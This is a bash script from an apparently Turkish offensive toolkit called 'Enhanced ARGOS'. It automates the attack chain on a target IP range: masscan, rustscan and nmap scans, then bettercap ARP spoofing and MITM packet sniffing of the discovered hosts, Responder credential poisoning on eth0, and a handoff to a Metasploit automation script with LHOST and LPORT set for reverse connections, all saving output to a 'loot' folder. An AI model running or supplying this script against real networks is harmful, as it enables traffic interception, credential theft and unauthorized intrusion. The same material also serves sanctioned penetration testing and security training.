# network.sh
#!/usr/bin/env bash
###############################################################################
# Enhanced ARGOS - Network Analysis
# Gelişmiş ağ tarama ve otomasyon betiği
###############################################################################

source "$(dirname "$0")/../utils.sh"

RED="\033[0;31m"
GREEN="\033[0;32m"
CYAN="\033[0;36m"
RESET="\033[0m"

cat << "EOF"
  ███╗   ███╗     ███╗     ███╗    ████╗ 
 █████╗ ██████╗  ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗██╔════╝
███████║██████╔╝██║  ███╗██║   ██║███████╗
██╔══██║██╔══██╗██║   ██║██║   ██║╚════██║
██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
                NETWORK ANALYSIS
EOF

RANGE="$1"
if [ -z "$RANGE" ]; then
  echo -ne "${CYAN}Enter target IP range or CIDR (e.g., 192.168.1.0/24): ${RESET}"
  read -r RANGE
  validate_ipcidr "$RANGE"
fi
[ -z "$RANGE" ] && { echo -e "${RED}[!] No range provided.${RESET}"; exit 1; }

LOOT_DIR="./loot/network"
mkdir -p "$LOOT_DIR"
TS=$(date +%Y%m%d_%H%M%S)

echo -ne "${CYAN}[?] Taramalar büyük olacak devam edilsin mi?  (y/N): ${RESET}"
read -r CONFIRM
[[ "$CONFIRM" =~ ^[Yy]$ ]] || exit 0

echo -e "${GREEN}[+] Starting network analysis on: $RANGE${RESET}"

# Masscan Tarama
if command -v masscan >/dev/null; then
  echo -ne "${CYAN}[?] Masscan rate [default=10000]: ${RESET}"
  read -r MSRATE
  MSRATE=${MSRATE:-10000}
  MS_OUT="$LOOT_DIR/masscan_$(echo "$RANGE" | sed 's|/|_|g')_${TS}.txt"
  echo -e "${CYAN}[*] Masscan scanning all ports at rate=$MSRATE ...${RESET}"
  sudo masscan "$RANGE" -p1-65535 --rate "$MSRATE" -oL "$MS_OUT"
fi

# RustScan Tarama
if command -v rustscan >/dev/null; then
  RS_OUT="$LOOT_DIR/rustscan_$(echo "$RANGE" | sed 's|/|_|g')_${TS}.txt"
  echo -e "${CYAN}[*] RustScan scanning ...${RESET}"
  rustscan -a "$RANGE" --ulimit 5000 -o "$RS_OUT"
fi

# Nmap Tarama
if command -v nmap >/dev/null; then
  SCAN="nmap_scan_$(echo "$RANGE" | sed 's|/|_|g')_${TS}"
  echo -e "${CYAN}[*] Nmap scanning all ports ...${RESET}"
  nmap -p- -sV -sC -O -Pn "$RANGE" -oA "$LOOT_DIR/$SCAN"

  if [ -f "$MS_OUT" ]; then
    PORTS=$(grep -oP '^\s*\d+(?=/tcp)' "$MS_OUT" | tr '\n' ',' | sed 's/,$//')
    if [ -n "$PORTS" ]; then
      SPEC_OUT="$LOOT_DIR/nmap_specific_$(echo "$RANGE" | sed 's|/|_|g')_${TS}"
      echo -e "${CYAN}[*] Nmap scanning open ports: $PORTS${RESET}"
      nmap -p"$PORTS" -sV -sC -O "$RANGE" -oA "$SPEC_OUT"
    fi
  fi
fi

# Bettercap
if command -v bettercap >/dev/null; then
  echo -ne "${CYAN}[?] Run Bettercap for MITM/ARP spoofing and analysis? (y/N): ${RESET}"
  read -r RUN_BC
  if [[ "$RUN_BC" =~ ^[Yy]$ ]]; then
    echo -ne "${CYAN}[*] Enter duration for ARP spoofing in seconds [default=30]: ${RESET}"
    read -r DURATION
    DURATION=${DURATION:-30}

    echo -e "${GREEN}[+] Initializing Bettercap...${RESET}"

    # Net Recon and Probing
    echo -e "${CYAN}[*] Starting network reconnaissance and packet analysis...${RESET}"
    sudo bettercap -eval "
      net.recon on;
      net.probe on;
      net.sniff on;
      sleep 15;  # Capture packets for 15 seconds
      net.sniff off;
    " | tee "$LOOT_DIR/bettercap_recon_${TS}.log"

    echo -e "${CYAN}[*] Packet analysis phase completed. Results saved to $LOOT_DIR/bettercap_recon_${TS}.log.${RESET}"

    # Validate if live targets are identified
    LIVE_TARGETS=$(grep "Found" "$LOOT_DIR/bettercap_recon_${TS}.log" | awk '{print $NF}' | tr '\n' ',')
    if [ -z "$LIVE_TARGETS" ]; then
      echo -e "${RED}[!] No live targets identified during reconnaissance.${RESET}"
      exit 1
    fi
    echo -e "${GREEN}[+] Identified live targets: $LIVE_TARGETS${RESET}"

    # ARP Spoofing and MITM
    echo -e "${CYAN}[*] Starting ARP spoofing and MITM attack on targets: $LIVE_TARGETS for $DURATION seconds.${RESET}"
    sudo bettercap -eval "
      set arp.spoof.targets $LIVE_TARGETS;
      set arp.spoof.internal true;
      arp.spoof on;
      net.sniff on;
      sleep $DURATION;  # Spoof and capture packets for the user-defined duration
      arp.spoof off;
      net.sniff off;
    " | tee "$LOOT_DIR/bettercap_arp_${TS}.log"

    echo -e "${GREEN}[+] ARP spoofing and MITM attack completed. Results saved to $LOOT_DIR/bettercap_arp_${TS}.log.${RESET}"

    # Error Analysis
    if grep -q "error" "$LOOT_DIR/bettercap_arp_${TS}.log"; then
      echo -e "${RED}[!] Errors detected during Bettercap execution. Check the log file for details.${RESET}"
    else
      echo -e "${GREEN}[+] No errors detected during Bettercap execution.${RESET}"
    fi
  fi
fi

# Responder
if command -v responder >/dev/null; then
  echo -ne "${CYAN}[?] Run Responder for SMB/NetBIOS analysis? (y/N): ${RESET}"
  read -r RUN_RESP
  if [[ "$RUN_RESP" =~ ^[Yy]$ ]]; then
    RESP_LOG="$LOOT_DIR/responder_${TS}.log"
    sudo responder -I eth0 -w -d | tee "$RESP_LOG"
    if grep -q "Error" "$RESP_LOG"; then
      echo -e "${RED}[!] Responder encountered errors. Check $RESP_LOG for details.${RESET}"
    else
      echo -e "${GREEN}[+] Responder completed successfully. Results saved to $RESP_LOG.${RESET}"
    fi
  fi
fi

###############################################################################
# EKLEME BAŞLANGICI: Metasploit Entegrasyonu
###############################################################################

# Metasploit Automation
if command -v bash >/dev/null && [ -f "$(dirname "$0")/metasploit.sh" ]; then
  echo -e "${GREEN}[+] Starting Metasploit automation...${RESET}"
  
  # Nmap XML dosyasını belirleme (Tüm portlar taraması)
  NMAP_XML="$LOOT_DIR/${SCAN}.xml"

  if [ -f "$NMAP_XML" ]; then
    # Kullanıcıdan LHOST ve LPORT bilgilerini almak (opsiyonel)
    echo -ne "${CYAN}Enter LHOST for Metasploit (default=$(hostname -I | awk '{print $1}')): ${RESET}"
    read -r M_LHOST
    M_LHOST=${M_LHOST:-$(hostname -I | awk '{print $1}')}
    
    echo -ne "${CYAN}Enter LPORT for Metasploit (default=4444): ${RESET}"
    read -r M_LPORT
    M_LPORT=${M_LPORT:-4444}

    # Metasploit betiğini çalıştırma
    bash "$(dirname "$0")/metasploit.sh" --xml "$NMAP_XML" --lhost "$M_LHOST" --lport "$M_LPORT" --loot "$LOOT_DIR"

    echo -e "${GREEN}[+] Metasploit automation completed.${RESET}"
  else
    echo -e "${RED}[!] Nmap XML output not found at $NMAP_XML. Skipping Metasploit automation.${RESET}"
  fi
else
  echo -e "${RED}[!] metasploit.sh not found or bash not available. Skipping Metasploit automation.${RESET}"
fi

###############################################################################
# EKLEME SONU
###############################################################################

echo -e "${GREEN}[NETWORK] Done. Results in $LOOT_DIR${RESET}"
exit 0
